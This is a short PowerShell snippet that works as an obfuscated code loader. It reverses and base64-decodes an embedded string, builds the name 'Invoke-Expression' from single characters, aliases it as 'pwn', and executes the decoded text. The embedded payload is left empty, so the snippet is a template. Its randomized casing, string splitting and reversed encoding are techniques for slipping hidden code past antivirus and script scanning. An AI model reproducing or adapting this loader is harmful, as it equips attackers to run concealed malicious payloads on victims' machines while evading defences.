$best64code = "==" ;
$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; -join $base64 2>&1> $null ;
$LoAdCodE = [sySteM.texT.ENCoDinG]::utf8.geTsTRING([sySTEm.CoNveRT]::fRomBASE64stRinG("$BAse64")) ;
$pwN = "I"+"n"+"v"+"o"+"K"+"e"+"-"+"e"+"X"+"p"+"R"+"E"+"s"+"s"+"i"+"o"+"n" ; nEw-aliAs -Name PwN -VALUe $PWN -Force ; pwn $loaDcodE ;
